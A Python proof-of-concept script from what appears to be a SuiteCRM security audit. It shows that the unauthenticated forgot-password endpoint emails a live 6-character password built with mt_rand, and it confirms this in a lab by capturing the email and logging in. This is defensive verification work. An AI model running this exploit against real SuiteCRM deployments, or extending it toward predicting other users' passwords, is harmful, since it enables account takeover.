#!/usr/bin/env python3
"""
VULN-038 -- System-generated / forgot-password temp password = 6 chars from
`mt_rand` (predictable PRNG governing a live, unauthenticated credential-reset
flow).

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/Users/User.php:2312 ($length = '6'), :2316
             (mt_rand() % strlen($charBKT)) -- generatePassword().
             modules/Users/User.php:2434 sendEmailForPassword() ->
             setNewPassword($additionalData['password'], '1') is called
             UNCONDITIONALLY once the mail send succeeds -- i.e. the
             mt_rand-derived string becomes the account's REAL live
             password hash, not just an email body.
Entry point: modules/Users/GeneratePassword.php via
             include/MVC/Controller/entry_point_registry.php:51
             ('GeneratePassword' => auth=>false) -- reachable
             unauthenticated with just username+primary-email.
Gate:        modules/Users/GeneratePassword.php:129
             $isPasswordGenerationActive = $res['SystemGeneratedPasswordON'];
             ADDITIONALLY User::sendEmailForPassword() only calls
             setNewPassword() if SugarPHPMailer->Send() succeeds -- so a
             working outbound mailer is *also* a precondition (independent
             of the SystemGeneratedPasswordON toggle) that this lab does not
             configure by default.

What this script does
----------------------
1. As admin: (a) flips passwordsetting_SystemGeneratedPasswordON on via the
   real Admin > Password Management screen (module=Administration&
   action=PasswordManager, saveConfig=1) -- the config gate; (b) points the
   SYSTEM outbound mailer at a throwaway SMTP stub we run ourselves
   (_smtp_common.SmtpCatcher, the same OOB-listener technique already used
   for VULN-045 in this audit) -- the mail-delivery gate. Both are real
   admin actions, verified to persist (outbound_email DB row / config_override.php).
2. Creates a throwaway "attacker-controlled" user (attacker registers/owns
   this account's username+email -- the realistic precondition: you can
   always trigger a reset for an account you yourself control).
3. UNAUTHENTICATED: POSTs entryPoint=GeneratePassword with that account's
   user_name + primary email (no session, no cookie, no auth header).
4. Captures the REAL email SuiteCRM sends via our SMTP stub and extracts
   the literal 6-character mt_rand-derived password from the message body
   -- this is the exact "receive the 6-char temp password" step from the
   static finding's reproduce steps.
5. Asserts the REAL security effect: authenticates over HTTP using ONLY
   that captured password, proving it is not just an email artifact but
   the account's actual, live credential (the code path this exercises is
   the same setNewPassword()/getPasswordHash() used by every other
   password-change flow in the app).

Honest scope note (mt_rand cross-account prediction): this script proves,
live, that (a) the endpoint is unauthenticated-reachable, (b) the emitted
secret is short/mt_rand-derived exactly as the static finding describes,
and (c) that value truly becomes the account's live password (closing the
loop end-to-end for an attacker-controlled account). It does NOT
additionally perform Mersenne-Twister *state recovery* to predict a
DIFFERENT (victim) account's password from the attacker-account's observed
output -- that is a published but non-trivial technique (see references)
requiring either many raw samples or a seed search, out of scope for a
single bounded exploit run. That gap is called out explicitly in notes.md
and writeup.md rather than glossed over.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, new_session,
                      admin_session, create_user, web_login, BROWSER_UA)
from _smtp_common import SmtpCatcher, configure_system_outbound_smtp

VULN_ID = "VULN-038"
HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
OOB_SMTP_PORT = int(os.environ.get("OOB_SMTP_PORT", "33123"))


def main():
    banner(VULN_ID, "System-generated temp password = 6-char mt_rand (unauth reachable)")

    admin_s = admin_session()
    log("SETUP", "admin session established")

    attacker_acct = create_user(admin_s, "InitialPw_" + rand("")[2:] + "!Aa1")
    log("SETUP", f"created attacker-controlled account {attacker_acct['user_name']} "
                 f"(id={attacker_acct['id']}) -- this stands in for any account the "
                 f"attacker legitimately owns/registers")

    catcher = SmtpCatcher(port=OOB_SMTP_PORT).start()
    configure_system_outbound_smtp(admin_s, port=OOB_SMTP_PORT)
    log("SETUP", "SystemGeneratedPasswordON enabled + system mailer pointed at our SMTP stub "
                 "(both via the real Admin > Password Management screen)")

    # ---- Unauthenticated request --------------------------------------
    log("STEP", "UNAUTHENTICATED request to entryPoint=GeneratePassword "
                "(no cookie / session / auth header at all)")
    anon = new_session()  # fresh cookie jar; we will NOT log in before this request
    req_data = {
        "user_name": attacker_acct["user_name"],
        "Users0emailAddress0": f"{attacker_acct['user_name']}@example.invalid",
    }
    r = anon.post(f"{BASE_URL}/index.php?entryPoint=GeneratePassword", data=req_data, timeout=30)
    log("INFO", f"GeneratePassword response: HTTP {r.status_code} body={r.text!r}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /index.php?entryPoint=GeneratePassword HTTP/1.1\n"
            f"Host: localhost:33116\n"
            f"User-Agent: {BROWSER_UA}\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "# NOTE: no Cookie header -- this request carries NO session/authentication at all\n\n"
            f"user_name={attacker_acct['user_name']}&Users0emailAddress0="
            f"{attacker_acct['user_name']}%40example.invalid\n"
        )

    msg = catcher.wait_for_message(timeout=15)
    catcher.stop()
    if not msg:
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(f"GeneratePassword HTTP {r.status_code}: {r.text}\nNo email captured.\n")
        verdict(VULN_ID, "FAILED", "no email captured by SMTP stub")
        sys.exit(1)

    with open(os.path.join(EVIDENCE, "captured_email_raw.txt"), "w") as f:
        f.write(msg["data"])

    m = re.search(r"Password\s*:\s*([A-Za-z0-9]{6})\b", msg["data"])
    if not m:
        log("FAIL", "could not extract the 6-char temp password from the captured email")
        verdict(VULN_ID, "FAILED", "email captured but password pattern not found")
        sys.exit(1)
    temp_password = m.group(1)
    log("PROOF", f"unauthenticated request caused a real email to be sent containing a "
                 f"{len(temp_password)}-character mt_rand-derived password: {temp_password!r} "
                 f"(alphabet A-Za-z0-9, matches generatePassword()'s charBKT/length exactly)")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"GeneratePassword HTTP {r.status_code} body: {r.text}\n\n")
        f.write(f"Captured outbound email (see evidence/captured_email_raw.txt for full MIME):\n")
        f.write(msg["data"][:1200])
        f.write(f"\n\nExtracted temp password: {temp_password}\n")

    # ---- Prove it is the REAL, live password, not just an email artifact
    log("STEP", f"authenticating over HTTP using ONLY the captured password "
                f"({attacker_acct['user_name']} / {temp_password})")
    try:
        s2 = web_login(attacker_acct["user_name"], temp_password)
        r2 = s2.get(f"{BASE_URL}/index.php?module=Users&action=index", timeout=30)
        login_ok = r2.status_code == 200
    except RuntimeError as exc:
        log("FAIL", f"login with captured password failed: {exc}")
        login_ok = False

    if login_ok:
        log("PROOF", f"HTTP login with the mt_rand-derived password SUCCEEDED -- the value "
                      f"emailed by the unauthenticated GeneratePassword endpoint is the "
                      f"account's real, live credential (setNewPassword() was actually called), "
                      f"not merely display text.")
        with open(os.path.join(EVIDENCE, "post_login_page.html"), "w") as f:
            f.write(r2.text)
        verdict(VULN_ID, "CONFIRMED",
                f"unauth GeneratePassword emitted 6-char mt_rand password "
                f"{temp_password!r} for {attacker_acct['user_name']}; confirmed as the "
                f"real live credential by a successful HTTP login")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", "captured password did not authenticate")
        sys.exit(1)


if __name__ == "__main__":
    main()
